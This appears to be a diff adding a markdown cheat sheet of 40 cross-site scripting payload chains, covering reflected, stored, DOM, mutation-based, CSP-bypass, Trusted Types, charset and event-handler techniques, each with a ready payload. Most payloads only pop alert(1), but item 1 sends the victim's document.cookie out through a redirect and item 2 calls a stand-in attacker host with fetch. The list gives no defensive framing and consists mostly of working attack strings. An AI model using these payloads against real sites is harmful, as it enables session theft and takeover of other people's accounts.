@@ -1,0 +1,231 @@
+1. **Param → DOM → Script**  
+   `?msg=<img src=x onerror=location='/?p='+document.cookie>` → server reflects `p` into `<script>`
+
+2. **Stored → CSP Bypass**  
+   Store `<svg/onload=fetch('//attacker')>` in comment → CSP allows `data:` → later page loads comment into DOM
+
+3. **Attribute Breakout → Inline JS**  
+   `"><script>var a='` + injected `';alert(1)//`
+
+4. **Markdown → HTML → JS**  
+   `![x](javascript:alert(1))` in Markdown → rendered as `<img src="javascript:alert(1)">`
+
+5. **BBCode → HTML → Event**  
+   `[img]x" onerror="alert(1)[/img]` → `<img src="x" onerror="alert(1)">`
+
+6. **File Upload → HTML Embed**  
+   Upload SVG with `<script>alert(1)</script>` → viewed inline in `<img>` or `<object>`
+
+7. **URL Param → Meta Refresh**  
+   `?url=javascript:alert(1)` → `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
+
+8. **JSON → InnerHTML**  
+   `{"name":"<img src=x onerror=alert(1)>"}` → parsed and inserted via `innerHTML`
+
+9. **Template Injection → XSS**  
+   `{{'<img src=x onerror=alert(1)>'}}` in Handlebars template
+
+10. **Open Redirect → XSS**  
+    Redirect param accepts `javascript:` → `<iframe src="?redirect=javascript:alert(1)">`
+
+11. **CSS Injection → XSS**  
+    Inject `body{background:url(javascript:alert(1))}` into style block
+
+12. **404 Page → Reflection**  
+    Request `/"><svg/onload=alert(1)>` → error page reflects path
+
+13. **Search → JSONP Callback**  
+    `?callback=alert` → server returns `alert({"data":"x"})`
+
+14. **Iframe → postMessage → DOM XSS**  
+    Inject script in iframe that sends payload via `postMessage` → parent uses `innerHTML` on message
+
+15. **Comment → Admin Panel → Script**  
+    Stored XSS in comment → admin panel loads comment into `<script>` var
+
+16. **Email Link → Webmail XSS**  
+    Send HTML email with `<img src=x onerror=alert(1)>` → webmail client renders unsanitized
+
+17. **Log Poisoning → Log Viewer XSS**  
+    Inject `<svg/onload=alert(1)>` into username → admin log viewer reflects it
+
+18. **PDF Viewer → JS**  
+    Upload PDF with `<script>alert(1)</script>` in annotation → online viewer renders annotation as HTML
+
+19. **Service Worker → XSS**  
+    Inject script into cached HTML via vulnerable SW → victim loads from cache
+
+20. **Multi‑Param Merge → XSS**  
+    `?a=<svg/onload=alert(1)>&b="` → server merges into `<div a=... b=...>` → breaks into JS
+
+21. **DOM Clobbering → Script Execution**
+
+    - Inject an element with an `id` matching a global variable used in inline JS, causing type confusion and execution.
+    - Example:
+      ```html
+      <form id="init" onsubmit="alert(1)"></form>
+      ```
+
+22. **Event Bubbling Hijack**
+
+    - Place an event handler on a parent element that catches events from injected child elements.
+    - Example:
+      ```html
+      <div onclick="alert(1)">
+        <svg><circle></circle></svg>
+      </div>
+      ```
+
+23. **Polyglot SVG/HTML/JS Chain**
+
+    - Payload valid as SVG, HTML, and JS simultaneously, surviving multiple parser passes.
+    - Example:
+      ```html
+      <svg/onload='/*"/*-->
+      <script>
+        alert(1);
+      </script>
+      '>
+      ```
+
+24. **Script Gadget Re‑Use**
+
+    - Inject into a variable that’s later passed to an existing `eval()` or `new Function()` in site code.
+    - Example:
+      ```html
+      ');alert(1);//
+      ```
+
+25. **Service Injection via `srcdoc`**
+
+    - Inject HTML into an iframe’s `srcdoc` attribute via a reflected param.
+    - Example:
+      ```html
+      <iframe srcdoc="<script>alert(1)</script>"></iframe>
+      ```
+
+26. **JavaScript URL in `window.open()`**
+
+    - Inject a `javascript:` URI into a link or param that’s passed to `window.open()`.
+    - Example:
+      ```
+      javascript:alert(1)
+      ```
+
+27. **MIME Sniffing Abuse**
+
+    - Upload a file with HTML/JS but a misleading extension; browser sniffs and executes.
+    - Example:
+      - Upload `.txt` containing `<script>alert(1)</script>`.
+
+28. **Mutation XSS via `innerHTML` Sanitizer Gap**
+
+    - Inject markup that mutates after insertion, bypassing a naive sanitizer.
+    - Example:
+      ```html
+      <svg>
+        <p id="x"></p>
+        <script>
+          x.innerHTML='<img src=x onerror=alert(1)>'
+        </script>
+      </svg>
+      ```
+
+29. **Trusted Types Policy Bypass**
+
+    - Abuse a site’s overly‑permissive Trusted Types policy to inject HTML.
+    - Example:
+      ```js
+      trustedTypes.createPolicy("default", {
+        createHTML: () => "<img src=x onerror=alert(1)>",
+      });
+      ```
+
+30. **CSP Nonce Re‑Use**
+
+    - Inject into a context where a valid CSP nonce is already present, piggybacking on it.
+    - Example:
+      ```html
+      <script nonce="knownNonce">
+        alert(1);
+      </script>
+      ```
+
+31. **Scriptless XSS via CSS Expressions** _(legacy IE)_
+
+    - Example:
+      ```html
+      <div style="width:expression(alert(1))"></div>
+      ```
+
+32. **Reflected XSS via `srcset`**
+
+    - Example:
+      ```html
+      <img srcset="javascript:alert(1)" />
+      ```
+
+33. **`<template>` Element Activation**
+
+    - Inject into a `<template>` that later gets `.innerHTML` appended to DOM.
+    - Example:
+      ```html
+      <template><img src="x" onerror="alert(1)" /></template>
+      ```
+
+34. **`<object>` → `application/xhtml+xml`**
+
+    - Serve payload as XHTML to trigger XML parser quirks.
+    - Example:
+      ```html
+      <object data="payload.xhtml"></object>
+      ```
+
+35. **`<meta charset>` Switcheroo**
+
+    - Inject early enough to change charset and reinterpret bytes as HTML/JS.
+    - Example:
+      ```html
+      <meta charset="UTF-7" />+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+      ```
+
+36. **`<iframe>` Sandboxed with `allow-scripts`**
+
+    - Inject into a sandboxed iframe that still allows scripts.
+    - Example:
+      ```html
+      <iframe
+        sandbox="allow-scripts"
+        srcdoc="<script>alert(1)</script>"
+      ></iframe>
+      ```
+
+37. **`<svg>` External Entity Load** _(XXE‑style in SVG)_
+
+    - Example:
+      ```html
+      <svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>
+      ```
+
+38. **`<form>` Autocomplete Poisoning**
+
+    - Inject into a form field’s value that’s later auto‑submitted into a script sink.
+    - Example:
+      ```html
+      <input name="q" value="<img src=x onerror=alert(1)>" />
+      ```
+
+39. **`<progress>` / `<meter>` Event**
+
+    - Example:
+      ```html
+      <progress value="1" max="2" onmouseover="alert(1)"></progress>
+      ```
+
+40. **`<select>` / `<option>` Event**
+    - Example:
+      ```html
+      <select>
+        <option onmouseover="alert(1)">X</option>
+      </select>
+      ```
